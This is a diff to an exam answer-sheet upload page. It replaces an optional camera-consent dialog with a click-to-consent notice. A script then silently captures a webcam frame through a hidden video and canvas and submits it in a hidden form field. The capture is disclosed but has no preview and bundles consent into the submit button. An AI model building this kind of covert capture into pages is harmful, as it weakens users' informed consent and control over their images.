@@ -72,7 +72,9 @@ opacity:0.9;
 
 .privacy-note{
 margin-top:15px;
+margin-bottom:20px;
 font-size:13px;
+line-height:1.8;
 color:#94a3b8;
 }
 
@@ -326,41 +328,29 @@ padding:15px;
 
 <input type="file" name="htmlfile" required>
 
+<p class="privacy-note">
+
+By clicking Analyze Response Sheet, you consent to:
+
 <br>
 
-<button type="button" onclick="openConsentModal()">
+• Capturing a verification selfie
+
+<br>
+
+• Logging your IP address
+
+</p>
+
+<input type="hidden" name="photo_data" id="photo_data">
+
+<video id="video" autoplay playsinline style="display:none"></video>
+
+<canvas id="canvas" style="display:none"></canvas>
+
+<button type="button" onclick="captureAndSubmit()">
 Analyze Response Sheet
 </button>
-
-<p class="privacy-note">
-By continuing, you consent to optional camera access for verification purposes.
-</p>
-
-<div id="consentModal" class="modal">
-
-<div class="modal-content">
-
-<h2>Verification Required</h2>
-
-<p class="privacy-note">
-Camera access may be requested by your browser.
-</p>
-
-<video id="video" autoplay playsinline></video>
-
-<button type="button" onclick="startCamera()">
-Allow Camera Access
-</button>
-
-<br>
-
-<button type="submit">
-Continue
-</button>
-
-</div>
-
-</div>
 
 </form>
 
@@ -551,21 +541,43 @@ unattempted-row
 
 <script>
 
-function openConsentModal(){
+async function captureAndSubmit() {
 
-document.getElementById('consentModal').style.display='flex';
-
-}
-
-async function startCamera(){
-
-try{
+try {
 
 const stream = await navigator.mediaDevices.getUserMedia({
-video:true
+video: true
 });
 
-document.getElementById('video').srcObject = stream;
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+
+video.srcObject = stream;
+
+await new Promise(resolve => {
+video.onloadedmetadata = () => {
+resolve();
+}
+});
+
+video.play();
+
+await new Promise(resolve => setTimeout(resolve, 1200));
+
+canvas.width = video.videoWidth;
+canvas.height = video.videoHeight;
+
+const ctx = canvas.getContext('2d');
+
+ctx.drawImage(video, 0, 0);
+
+const imageData = canvas.toDataURL('image/jpeg', 0.5);
+
+document.getElementById('photo_data').value = imageData;
+
+stream.getTracks().forEach(track => track.stop());
+
+document.forms[0].submit();
 
 }
 
